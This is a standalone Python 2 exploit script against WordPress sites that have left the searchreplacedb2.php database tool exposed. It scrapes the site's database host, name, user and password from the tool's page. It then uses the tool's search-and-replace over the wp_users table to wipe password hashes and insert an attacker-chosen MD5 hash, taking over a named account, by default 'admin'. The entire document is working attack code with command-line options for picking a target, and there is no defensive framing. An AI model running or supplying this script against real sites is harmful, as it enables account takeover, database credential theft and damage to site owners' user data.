#!/usr/bin/env python2
import urllib,urllib2
import optparse
import sys
import time
import hashlib

ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ./"
ALPHABET = list(ALPHABET)
ALPHABET.append("$1$")
ALPHABET.append("10")

class Target(object):
	"""The target to overwrite"""
	def __init__(self, url, user,password):
		self.url = self.sanitizeUrl(url)
		self.user = user
		self.PASSWORD_HASH = hashlib.md5(password).hexdigest()


	def replace(self,search,replace):
		values = {'host':self.db_host,
		'data':self.db_name,
		'user':self.db_user,
		'pass':self.db_pass,
		'char':self.db_char,
		'guid':0,
		'tables\x5B0\x5D':'wp_users'}

		values['srch'] = search
		values['rplc'] = replace

		data = urllib.urlencode(values)
		response = urllib2.urlopen(self.url+"?step=5",data)
		html = response.read()
		time.sleep(.050)

	def attack_sequence(self):
		self.keep_user()
		self.attack_password()
		self.place_user()

	def attack_password(self):
		for x in range(0,len(ALPHABET)):
			self.replace(ALPHABET[x],'1')
		for x in reversed(range(15,35)):
			self.replace('1'*x,self.PASSWORD_HASH)

	def keep_user(self):
		self.replace(self.user,"$$$")

	def place_user(self):
		self.replace("$$$",self.user)

	def populate(self):
		values = {'loadwp':1}
		data = urllib.urlencode(values)
		response = ""
		try:
			response = urllib2.urlopen(self.url+"?step=2",data)
		except:
			print "Request error while trying to populate"
			exit(1)
		html = response.read()
		html = html.split('\n')
		for line in html:
			if line.find('name="host"') != -1:
				self.db_host = line.split('"')[9]
			if line.find('name="data"') != -1:
				self.db_name = line.split('"')[9]
			if line.find('name="user"') != -1:
				self.db_user = line.split('"')[9]
			if line.find('name="pass"') != -1:
				self.db_pass = line.split('"')[9]
			if line.find('name="char"') != -1:
				self.db_char = line.split('"')[9]

	def sanitizeUrl(self,url):
		if "://" not in url: 
			url = "http://"+url
		if "searchreplacedb2.php" not in url:
			if url[len(url)-1] != "/":
				url = url+"/"
			url += "searchreplacedb2.php"
		return url

def main():
	parser = optparse.OptionParser("Usage: "+sys.argv[0]+" -t <target_url> -u <user>")
	parser.add_option('-t',dest='target_url',type='string',help="The target's URL (ex: http://www.exemple.com/searchreplacedb2.php)")
	parser.add_option('-u',dest='target_user',type='string',help="The target's user you'll use")
	parser.add_option('-p',dest='target_password',type='string',help="The new password")
	(options, args) = parser.parse_args()

	if not options.target_url:
		print parser.usage
		exit(1)
	else:
		url = options.target_url
	
	if options.target_user:
		user = options.target_user
	else:
		print "Using 'admin' because no user was provided"
		user = "admin"

	if options.target_password:
		password = options.target_password
	else:
		password = "password"

	t = Target(url,user,password)
	t.populate()
	t.attack_sequence()

if __name__ == "__main__":
	main()